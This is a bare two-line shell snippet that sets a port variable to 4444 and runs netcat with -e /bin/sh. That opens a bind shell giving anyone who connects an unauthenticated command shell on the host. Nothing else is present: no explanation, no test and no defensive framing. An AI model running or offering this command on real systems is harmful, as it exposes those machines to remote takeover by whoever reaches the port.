port=4444

nc -lvp $port -e /bin/sh
